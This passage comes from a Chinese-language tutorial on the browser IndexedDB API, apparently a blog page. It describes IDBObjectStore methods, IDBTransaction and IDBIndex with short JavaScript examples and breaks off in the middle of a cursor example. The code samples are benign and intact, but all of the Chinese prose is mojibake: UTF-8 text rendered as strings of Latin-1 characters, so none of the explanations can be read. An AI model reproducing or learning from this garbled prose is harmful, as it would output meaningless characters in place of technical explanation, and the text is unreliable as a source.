<li><code>IDBObjectStore.autoIncrement</code>ï¼šå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºä¸»é”®æ˜¯å¦ä¼šè‡ªåŠ¨é€’å¢ã€‚</li>
</ul>
<h4 id="æ–¹æ³•-3"><a href="#æ–¹æ³•-3" class="headerlink" title="æ–¹æ³•"></a>æ–¹æ³•</h4><p>IDBObjectStore å¯¹è±¡æœ‰ä»¥ä¸‹æ–¹æ³•ã€‚</p>
<p><strong>ï¼ˆ1ï¼‰IDBObjectStore.add()</strong></p>
<p><code>IDBObjectStore.add()</code>ç”¨äºå‘å¯¹è±¡ä»“åº“æ·»åŠ æ•°æ®ï¼Œè¿”å›ä¸€ä¸ª IDBRequest å¯¹è±¡ã€‚è¯¥æ–¹æ³•åªç”¨äºæ·»åŠ æ•°æ®ï¼Œå¦‚æœä¸»é”®ç›¸åŒä¼šæŠ¥é”™ï¼Œå› æ­¤æ›´æ–°æ•°æ®å¿…é¡»ä½¿ç”¨<code>put()</code>æ–¹æ³•ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objectStore.add(value, key)</span><br></pre></td></tr></table></figure>

<p>è¯¥æ–¹æ³•æ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯é”®å€¼ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸»é”®ï¼Œè¯¥å‚æ•°å¯é€‰ï¼Œå¦‚æœçœç•¥é»˜è®¤ä¸º<code>null</code>ã€‚</p>
<p>åˆ›å»ºäº‹åŠ¡ä»¥åï¼Œå°±å¯ä»¥è·å–å¯¹è±¡ä»“åº“ï¼Œç„¶åä½¿ç”¨<code>add()</code>æ–¹æ³•å¾€é‡Œé¢æ·»åŠ æ•°æ®äº†ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">var db;</span><br><span class="line">var DBOpenRequest &#x3D; window.indexedDB.open(&#39;demo&#39;, 1);</span><br><span class="line"></span><br><span class="line">DBOpenRequest.onsuccess &#x3D; function (event) &#123;</span><br><span class="line">  db &#x3D; DBOpenRequest.result;</span><br><span class="line">  var transaction &#x3D; db.transaction([&#39;items&#39;], &#39;readwrite&#39;);</span><br><span class="line"></span><br><span class="line">  transaction.oncomplete &#x3D; function (event) &#123;</span><br><span class="line">    console.log(&#39;transaction success&#39;);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  transaction.onerror &#x3D; function (event) &#123;</span><br><span class="line">    console.log(&#39;transaction error: &#39; + transaction.error);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  var objectStore &#x3D; transaction.objectStore(&#39;items&#39;);</span><br><span class="line">  var objectStoreRequest &#x3D; objectStore.add(&#123; foo: 1 &#125;);</span><br><span class="line"></span><br><span class="line">  objectStoreRequest.onsuccess &#x3D; function (event) &#123;</span><br><span class="line">    console.log(&#39;add data success&#39;);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>ï¼ˆ2ï¼‰IDBObjectStore.put()</strong></p>
<p><code>IDBObjectStore.put()</code>æ–¹æ³•ç”¨äºæ›´æ–°æŸä¸ªä¸»é”®å¯¹åº”çš„æ•°æ®è®°å½•ï¼Œå¦‚æœå¯¹åº”çš„é”®å€¼ä¸å­˜åœ¨ï¼Œåˆ™æ’å…¥ä¸€æ¡æ–°çš„è®°å½•ã€‚è¯¥æ–¹æ³•è¿”å›ä¸€ä¸ª IDBRequest å¯¹è±¡ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objectStore.put(item, key)</span><br></pre></td></tr></table></figure>

<p>è¯¥æ–¹æ³•æ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ–°æ•°æ®ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºä¸»é”®ï¼Œè¯¥å‚æ•°å¯é€‰ï¼Œä¸”åªåœ¨è‡ªåŠ¨é€’å¢æ—¶æ‰æœ‰å¿…è¦æä¾›ï¼Œå› ä¸ºé‚£æ—¶ä¸»é”®ä¸åŒ…å«åœ¨æ•°æ®å€¼é‡Œé¢ã€‚</p>
<p><strong>ï¼ˆ3ï¼‰IDBObjectStore.clear()</strong></p>
<p><code>IDBObjectStore.clear()</code>åˆ é™¤å½“å‰å¯¹è±¡ä»“åº“çš„æ‰€æœ‰è®°å½•ã€‚è¯¥æ–¹æ³•è¿”å›ä¸€ä¸ª IDBRequest å¯¹è±¡ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objectStore.clear()</span><br></pre></td></tr></table></figure>

<p>è¯¥æ–¹æ³•ä¸éœ€è¦å‚æ•°ã€‚</p>
<p><strong>ï¼ˆ4ï¼‰IDBObjectStore.delete()</strong></p>
<p><code>IDBObjectStore.delete()</code>æ–¹æ³•ç”¨äºåˆ é™¤æŒ‡å®šä¸»é”®çš„è®°å½•ã€‚è¯¥æ–¹æ³•è¿”å›ä¸€ä¸ª IDBRequest å¯¹è±¡ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objectStore.delete(Key)</span><br></pre></td></tr></table></figure>

<p>è¯¥æ–¹æ³•çš„å‚æ•°ä¸ºä¸»é”®çš„å€¼ã€‚</p>
<p><strong>ï¼ˆ5ï¼‰IDBObjectStore.count()</strong></p>
<p><code>IDBObjectStore.count()</code>æ–¹æ³•ç”¨äºè®¡ç®—è®°å½•çš„æ•°é‡ã€‚è¯¥æ–¹æ³•è¿”å›ä¸€ä¸ª IDBRequest å¯¹è±¡ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IDBObjectStore.count(key)</span><br></pre></td></tr></table></figure>

<p>ä¸å¸¦å‚æ•°æ—¶ï¼Œè¯¥æ–¹æ³•è¿”å›å½“å‰å¯¹è±¡ä»“åº“çš„æ‰€æœ‰è®°å½•æ•°é‡ã€‚å¦‚æœä¸»é”®æˆ– IDBKeyRange å¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œåˆ™è¿”å›å¯¹åº”çš„è®°å½•æ•°é‡ã€‚</p>
<p><strong>ï¼ˆ6ï¼‰IDBObjectStore.getKey()</strong></p>
<p><code>IDBObjectStore.getKey()</code>ç”¨äºè·å–ä¸»é”®ã€‚è¯¥æ–¹æ³•è¿”å›ä¸€ä¸ª IDBRequest å¯¹è±¡ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objectStore.getKey(key)</span><br></pre></td></tr></table></figure>

<p>è¯¥æ–¹æ³•çš„å‚æ•°å¯ä»¥æ˜¯ä¸»é”®å€¼æˆ– IDBKeyRange å¯¹è±¡ã€‚</p>
<p><strong>ï¼ˆ7ï¼‰IDBObjectStore.get()</strong></p>
<p><code>IDBObjectStore.get()</code>ç”¨äºè·å–ä¸»é”®å¯¹åº”çš„æ•°æ®è®°å½•ã€‚è¯¥æ–¹æ³•è¿”å›ä¸€ä¸ª IDBRequest å¯¹è±¡ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objectStore.get(key)</span><br></pre></td></tr></table></figure>

<p><strong>ï¼ˆ8ï¼‰IDBObjectStore.getAll()</strong></p>
<p><code>DBObjectStore.getAll()</code>ç”¨äºè·å–å¯¹è±¡ä»“åº“çš„è®°å½•ã€‚è¯¥æ–¹æ³•è¿”å›ä¸€ä¸ª IDBRequest å¯¹è±¡ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; è·å–æ‰€æœ‰è®°å½•</span><br><span class="line">objectStore.getAll()</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; è·å–æ‰€æœ‰ç¬¦åˆæŒ‡å®šä¸»é”®æˆ– IDBKeyRange çš„è®°å½•</span><br><span class="line">objectStore.getAll(query)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; æŒ‡å®šè·å–è®°å½•çš„æ•°é‡</span><br><span class="line">objectStore.getAll(query, count)</span><br></pre></td></tr></table></figure>

<p><strong>ï¼ˆ9ï¼‰IDBObjectStore.getAllKeys()</strong></p>
<p><code>IDBObjectStore.getAllKeys()</code>ç”¨äºè·å–æ‰€æœ‰ç¬¦åˆæ¡ä»¶çš„ä¸»é”®ã€‚è¯¥æ–¹æ³•è¿”å›ä¸€ä¸ª IDBRequest å¯¹è±¡ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; è·å–æ‰€æœ‰è®°å½•çš„ä¸»é”®</span><br><span class="line">objectStore.getAllKeys()</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; è·å–æ‰€æœ‰ç¬¦åˆæ¡ä»¶çš„ä¸»é”®</span><br><span class="line">objectStore.getAllKeys(query)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; æŒ‡å®šè·å–ä¸»é”®çš„æ•°é‡</span><br><span class="line">objectStore.getAllKeys(query, count)</span><br></pre></td></tr></table></figure>

<p><strong>ï¼ˆ10ï¼‰IDBObjectStore.index()</strong></p>
<p><code>IDBObjectStore.index()</code>æ–¹æ³•è¿”å›æŒ‡å®šåç§°çš„ç´¢å¼•å¯¹è±¡ IDBIndexã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objectStore.index(name)</span><br></pre></td></tr></table></figure>

<p>æœ‰äº†ç´¢å¼•ä»¥åï¼Œå°±å¯ä»¥é’ˆå¯¹ç´¢å¼•æ‰€åœ¨çš„å±æ€§è¯»å–æ•°æ®ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var t &#x3D; db.transaction([&#39;people&#39;], &#39;readonly&#39;);</span><br><span class="line">var store &#x3D; t.objectStore(&#39;people&#39;);</span><br><span class="line">var index &#x3D; store.index(&#39;name&#39;);</span><br><span class="line"></span><br><span class="line">var request &#x3D; index.get(&#39;foo&#39;);</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç æ‰“å¼€å¯¹è±¡ä»“åº“ä»¥åï¼Œå…ˆç”¨<code>index()</code>æ–¹æ³•æŒ‡å®šè·å–<code>name</code>å±æ€§çš„ç´¢å¼•ï¼Œç„¶åç”¨<code>get()</code>æ–¹æ³•è¯»å–æŸä¸ª<code>name</code>å±æ€§(<code>foo</code>)å¯¹åº”çš„æ•°æ®ã€‚å¦‚æœ<code>name</code>å±æ€§ä¸æ˜¯å¯¹åº”å”¯ä¸€å€¼ï¼Œè¿™æ—¶<code>get()</code>æ–¹æ³•æœ‰å¯èƒ½å–å›å¤šä¸ªæ•°æ®å¯¹è±¡ã€‚å¦å¤–ï¼Œ<code>get()</code>æ˜¯å¼‚æ­¥æ–¹æ³•ï¼Œè¯»å–æˆåŠŸä»¥åï¼Œåªèƒ½åœ¨<code>success</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ä¸­å¤„ç†æ•°æ®ã€‚</p>
<p><strong>ï¼ˆ11ï¼‰IDBObjectStore.createIndex()</strong></p>
<p><code>IDBObjectStore.createIndex()</code>æ–¹æ³•ç”¨äºæ–°å»ºå½“å‰æ•°æ®åº“çš„ä¸€ä¸ªç´¢å¼•ã€‚è¯¥æ–¹æ³•åªèƒ½åœ¨<code>VersionChange</code>ç›‘å¬å‡½æ•°é‡Œé¢è°ƒç”¨ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objectStore.createIndex(indexName, keyPath, objectParameters)</span><br></pre></td></tr></table></figure>

<p>è¯¥æ–¹æ³•å¯ä»¥æ¥å—ä¸‰ä¸ªå‚æ•°ã€‚</p>
<ul>
<li>indexNameï¼šç´¢å¼•å</li>
<li>keyPathï¼šä¸»é”®</li>
<li>objectParametersï¼šé…ç½®å¯¹è±¡ï¼ˆå¯é€‰ï¼‰</li>
</ul>
<p>ç¬¬ä¸‰ä¸ªå‚æ•°å¯ä»¥é…ç½®ä»¥ä¸‹å±æ€§ã€‚</p>
<ul>
<li>uniqueï¼šå¦‚æœè®¾ä¸º<code>true</code>ï¼Œå°†ä¸å…è®¸é‡å¤çš„å€¼</li>
<li>multiEntryï¼šå¦‚æœè®¾ä¸º<code>true</code>ï¼Œå¯¹äºæœ‰å¤šä¸ªå€¼çš„ä¸»é”®æ•°ç»„ï¼Œæ¯ä¸ªå€¼å°†åœ¨ç´¢å¼•é‡Œé¢æ–°å»ºä¸€ä¸ªæ¡ç›®ï¼Œå¦åˆ™ä¸»é”®æ•°ç»„å¯¹åº”ä¸€ä¸ªæ¡ç›®ã€‚</li>
</ul>
<p>å‡å®šå¯¹è±¡ä»“åº“ä¸­çš„æ•°æ®è®°å½•éƒ½æ˜¯å¦‚ä¸‹çš„<code>person</code>ç±»å‹ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var person &#x3D; &#123;</span><br><span class="line">  name: name,</span><br><span class="line">  email: email,</span><br><span class="line">  created: new Date()</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥æŒ‡å®šè¿™ä¸ªå¯¹è±¡çš„æŸä¸ªå±æ€§æ¥å»ºç«‹ç´¢å¼•ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var store &#x3D; db.createObjectStore(&#39;people&#39;, &#123; autoIncrement: true &#125;);</span><br><span class="line"></span><br><span class="line">store.createIndex(&#39;name&#39;, &#39;name&#39;, &#123; unique: false &#125;);</span><br><span class="line">store.createIndex(&#39;email&#39;, &#39;email&#39;, &#123; unique: true &#125;);</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç å‘Šè¯‰ç´¢å¼•å¯¹è±¡ï¼Œ<code>name</code>å±æ€§ä¸æ˜¯å”¯ä¸€å€¼ï¼Œ<code>email</code>å±æ€§æ˜¯å”¯ä¸€å€¼ã€‚</p>
<p><strong>ï¼ˆ12ï¼‰IDBObjectStore.deleteIndex()</strong></p>
<p><code>IDBObjectStore.deleteIndex()</code>æ–¹æ³•ç”¨äºåˆ é™¤æŒ‡å®šçš„ç´¢å¼•ã€‚è¯¥æ–¹æ³•åªèƒ½åœ¨<code>VersionChange</code>ç›‘å¬å‡½æ•°é‡Œé¢è°ƒç”¨ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objectStore.deleteIndex(indexName)</span><br></pre></td></tr></table></figure>

<p><strong>ï¼ˆ13ï¼‰IDBObjectStore.openCursor()</strong></p>
<p><code>IDBObjectStore.openCursor()</code>ç”¨äºè·å–ä¸€ä¸ªæŒ‡é’ˆå¯¹è±¡ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IDBObjectStore.openCursor()</span><br></pre></td></tr></table></figure>

<p>æŒ‡é’ˆå¯¹è±¡å¯ä»¥ç”¨æ¥éå†æ•°æ®ã€‚è¯¥å¯¹è±¡ä¹Ÿæ˜¯å¼‚æ­¥çš„ï¼Œæœ‰è‡ªå·±çš„<code>success</code>å’Œ<code>error</code>äº‹ä»¶ï¼Œå¯ä»¥å¯¹å®ƒä»¬æŒ‡å®šç›‘å¬å‡½æ•°ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var t &#x3D; db.transaction([&#39;test&#39;], &#39;readonly&#39;);</span><br><span class="line">var store &#x3D; t.objectStore(&#39;test&#39;);</span><br><span class="line"></span><br><span class="line">var cursor &#x3D; store.openCursor();</span><br><span class="line"></span><br><span class="line">cursor.onsuccess &#x3D; function (event) &#123;</span><br><span class="line">  var res &#x3D; event.target.result;</span><br><span class="line">  if (res) &#123;</span><br><span class="line">    console.log(&#39;Key&#39;, res.key);</span><br><span class="line">    console.dir(&#39;Data&#39;, res.value);</span><br><span class="line">    res.continue();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç›‘å¬å‡½æ•°æ¥å—ä¸€ä¸ªäº‹ä»¶å¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œè¯¥å¯¹è±¡çš„<code>target.result</code>å±æ€§æŒ‡å‘å½“å‰æ•°æ®è®°å½•ã€‚è¯¥è®°å½•çš„<code>key</code>å’Œ<code>value</code>åˆ†åˆ«è¿”å›ä¸»é”®å’Œé”®å€¼ï¼ˆå³å®é™…å­˜å…¥çš„æ•°æ®ï¼‰ã€‚<code>continue()</code>æ–¹æ³•å°†å…‰æ ‡ç§»åˆ°ä¸‹ä¸€ä¸ªæ•°æ®å¯¹è±¡ï¼Œå¦‚æœå½“å‰æ•°æ®å¯¹è±¡å·²ç»æ˜¯æœ€åä¸€ä¸ªæ•°æ®äº†ï¼Œåˆ™å…‰æ ‡æŒ‡å‘<code>null</code>ã€‚</p>
<p><code>openCursor()</code>æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸»é”®å€¼ï¼Œæˆ–è€…ä¸€ä¸ª IDBKeyRange å¯¹è±¡ã€‚å¦‚æœæŒ‡å®šè¯¥å‚æ•°ï¼Œå°†åªå¤„ç†åŒ…å«æŒ‡å®šä¸»é”®çš„è®°å½•ï¼›å¦‚æœçœç•¥ï¼Œå°†å¤„ç†æ‰€æœ‰çš„è®°å½•ã€‚è¯¥æ–¹æ³•è¿˜å¯ä»¥æ¥å—ç¬¬äºŒä¸ªå‚æ•°ï¼Œè¡¨ç¤ºéå†æ–¹å‘ï¼Œé»˜è®¤å€¼ä¸º<code>next</code>ï¼Œå…¶ä»–å¯èƒ½çš„å€¼ä¸º<code>prev</code>ã€<code>nextunique</code>å’Œ<code>prevunique</code>ã€‚åä¸¤ä¸ªå€¼è¡¨ç¤ºå¦‚æœé‡åˆ°é‡å¤å€¼ï¼Œä¼šè‡ªåŠ¨è·³è¿‡ã€‚</p>
<p><strong>ï¼ˆ14ï¼‰IDBObjectStore.openKeyCursor()</strong></p>
<p><code>IDBObjectStore.openKeyCursor()</code>ç”¨äºè·å–ä¸€ä¸ªä¸»é”®æŒ‡é’ˆå¯¹è±¡ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IDBObjectStore.openKeyCursor()</span><br></pre></td></tr></table></figure>

<h3 id="IDBTransaction-å¯¹è±¡"><a href="#IDBTransaction-å¯¹è±¡" class="headerlink" title="IDBTransaction å¯¹è±¡"></a>IDBTransaction å¯¹è±¡</h3><p>IDBTransaction å¯¹è±¡ç”¨æ¥å¼‚æ­¥æ“ä½œæ•°æ®åº“äº‹åŠ¡ï¼Œæ‰€æœ‰çš„è¯»å†™æ“ä½œéƒ½è¦é€šè¿‡è¿™ä¸ªå¯¹è±¡è¿›è¡Œã€‚</p>
<p><code>IDBDatabase.transaction()</code>æ–¹æ³•è¿”å›çš„å°±æ˜¯ä¸€ä¸ª IDBTransaction å¯¹è±¡ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">var db;</span><br><span class="line">var DBOpenRequest &#x3D; window.indexedDB.open(&#39;demo&#39;, 1);</span><br><span class="line"></span><br><span class="line">DBOpenRequest.onsuccess &#x3D; function(event) &#123;</span><br><span class="line">  db &#x3D; DBOpenRequest.result;</span><br><span class="line">  var transaction &#x3D; db.transaction([&#39;demo&#39;], &#39;readwrite&#39;);</span><br><span class="line"></span><br><span class="line">  transaction.oncomplete &#x3D; function (event) &#123;</span><br><span class="line">    console.log(&#39;transaction success&#39;);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  transaction.onerror &#x3D; function (event) &#123;</span><br><span class="line">    console.log(&#39;transaction error: &#39; + transaction.error);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  var objectStore &#x3D; transaction.objectStore(&#39;demo&#39;);</span><br><span class="line">  var objectStoreRequest &#x3D; objectStore.add(&#123; foo: 1 &#125;);</span><br><span class="line"></span><br><span class="line">  objectStoreRequest.onsuccess &#x3D; function (event) &#123;</span><br><span class="line">    console.log(&#39;add data success&#39;);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>äº‹åŠ¡çš„æ‰§è¡Œé¡ºåºæ˜¯æŒ‰ç…§åˆ›å»ºçš„é¡ºåºï¼Œè€Œä¸æ˜¯å‘å‡ºè¯·æ±‚çš„é¡ºåºã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var trans1 &#x3D; db.transaction(&#39;foo&#39;, &#39;readwrite&#39;);</span><br><span class="line">var trans2 &#x3D; db.transaction(&#39;foo&#39;, &#39;readwrite&#39;);</span><br><span class="line">var objectStore2 &#x3D; trans2.objectStore(&#39;foo&#39;)</span><br><span class="line">var objectStore1 &#x3D; trans1.objectStore(&#39;foo&#39;)</span><br><span class="line">objectStore2.put(&#39;2&#39;, &#39;key&#39;);</span><br><span class="line">objectStore1.put(&#39;1&#39;, &#39;key&#39;);</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>key</code>å¯¹åº”çš„é”®å€¼æœ€ç»ˆæ˜¯<code>2</code>ï¼Œè€Œä¸æ˜¯<code>1</code>ã€‚å› ä¸ºäº‹åŠ¡<code>trans1</code>å…ˆäº<code>trans2</code>åˆ›å»ºï¼Œæ‰€ä»¥é¦–å…ˆæ‰§è¡Œã€‚</p>
<p>æ³¨æ„ï¼Œäº‹åŠ¡æœ‰å¯èƒ½å¤±è´¥ï¼Œåªæœ‰ç›‘å¬åˆ°äº‹åŠ¡çš„<code>complete</code>äº‹ä»¶ï¼Œæ‰èƒ½ä¿è¯äº‹åŠ¡æ“ä½œæˆåŠŸã€‚</p>
<p>IDBTransaction å¯¹è±¡æœ‰ä»¥ä¸‹å±æ€§ã€‚</p>
<ul>
<li><code>IDBTransaction.db</code>ï¼šè¿”å›å½“å‰äº‹åŠ¡æ‰€åœ¨çš„æ•°æ®åº“å¯¹è±¡ IDBDatabaseã€‚</li>
<li><code>IDBTransaction.error</code>ï¼šè¿”å›å½“å‰äº‹åŠ¡çš„é”™è¯¯ã€‚å¦‚æœäº‹åŠ¡æ²¡æœ‰ç»“æŸï¼Œæˆ–è€…äº‹åŠ¡æˆåŠŸç»“æŸï¼Œæˆ–è€…è¢«æ‰‹åŠ¨ç»ˆæ­¢ï¼Œè¯¥æ–¹æ³•è¿”å›<code>null</code>ã€‚</li>
<li><code>IDBTransaction.mode</code>ï¼šè¿”å›å½“å‰äº‹åŠ¡çš„æ¨¡å¼ï¼Œé»˜è®¤æ˜¯<code>readonly</code>ï¼ˆåªè¯»ï¼‰ï¼Œå¦ä¸€ä¸ªå€¼æ˜¯<code>readwrite</code>ã€‚</li>
<li><code>IDBTransaction.objectStoreNames</code>ï¼šè¿”å›ä¸€ä¸ªç±»ä¼¼æ•°ç»„çš„å¯¹è±¡ DOMStringListï¼Œæˆå‘˜æ˜¯å½“å‰äº‹åŠ¡æ¶‰åŠçš„å¯¹è±¡ä»“åº“çš„åå­—ã€‚</li>
<li><code>IDBTransaction.onabort</code>ï¼šæŒ‡å®š<code>abort</code>äº‹ä»¶ï¼ˆäº‹åŠ¡ä¸­æ–­ï¼‰çš„ç›‘å¬å‡½æ•°ã€‚</li>
<li><code>IDBTransaction.oncomplete</code>ï¼šæŒ‡å®š<code>complete</code>äº‹ä»¶ï¼ˆäº‹åŠ¡æˆåŠŸï¼‰çš„ç›‘å¬å‡½æ•°ã€‚</li>
<li><code>IDBTransaction.onerror</code>ï¼šæŒ‡å®š<code>error</code>äº‹ä»¶ï¼ˆäº‹åŠ¡å¤±è´¥ï¼‰çš„ç›‘å¬å‡½æ•°ã€‚</li>
</ul>
<p>IDBTransaction å¯¹è±¡æœ‰ä»¥ä¸‹æ–¹æ³•ã€‚</p>
<ul>
<li><code>IDBTransaction.abort()</code>ï¼šç»ˆæ­¢å½“å‰äº‹åŠ¡ï¼Œå›æ»šæ‰€æœ‰å·²ç»è¿›è¡Œçš„å˜æ›´ã€‚</li>
<li><code>IDBTransaction.objectStore(name)</code>ï¼šè¿”å›æŒ‡å®šåç§°çš„å¯¹è±¡ä»“åº“ IDBObjectStoreã€‚</li>
</ul>
<h3 id="IDBIndex-å¯¹è±¡"><a href="#IDBIndex-å¯¹è±¡" class="headerlink" title="IDBIndex å¯¹è±¡"></a>IDBIndex å¯¹è±¡</h3><p>IDBIndex å¯¹è±¡ä»£è¡¨æ•°æ®åº“çš„ç´¢å¼•ï¼Œé€šè¿‡è¿™ä¸ªå¯¹è±¡å¯ä»¥è·å–æ•°æ®åº“é‡Œé¢çš„è®°å½•ã€‚æ•°æ®è®°å½•çš„ä¸»é”®é»˜è®¤å°±æ˜¯å¸¦æœ‰ç´¢å¼•ï¼ŒIDBIndex å¯¹è±¡ä¸»è¦ç”¨äºé€šè¿‡é™¤ä¸»é”®ä»¥å¤–çš„å…¶ä»–é”®ï¼Œå»ºç«‹ç´¢å¼•è·å–å¯¹è±¡ã€‚</p>
<p>IDBIndex æ˜¯æŒä¹…æ€§çš„é”®å€¼å¯¹å­˜å‚¨ã€‚åªè¦æ’å…¥ã€æ›´æ–°æˆ–åˆ é™¤æ•°æ®è®°å½•ï¼Œå¼•ç”¨çš„å¯¹è±¡åº“ä¸­çš„è®°å½•ï¼Œç´¢å¼•å°±ä¼šè‡ªåŠ¨æ›´æ–°ã€‚</p>
<p><code>IDBObjectStore.index()</code>æ–¹æ³•å¯ä»¥è·å– IDBIndex å¯¹è±¡ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">var transaction &#x3D; db.transaction([&#39;contactsList&#39;], &#39;readonly&#39;);</span><br><span class="line">var objectStore &#x3D; transaction.objectStore(&#39;contactsList&#39;);</span><br><span class="line">var myIndex &#x3D; objectStore.index(&#39;lName&#39;);</span><br><span class="line"></span><br><span class="line">myIndex.openCursor().onsuccess &#x3D; function (event) &#123;</span><br><span class="line">  var cursor &#x3D; event.target.result;</span><br><span class="line">  if (cursor) &#123;</span><br><span class="line">    var tableRow &#x3D; document.createElement(&#39;tr&#39;);</span><br><span class="line">    tableRow.innerHTML &#x3D;   &#39;&lt;td&gt;&#39; + cursor.value.id + 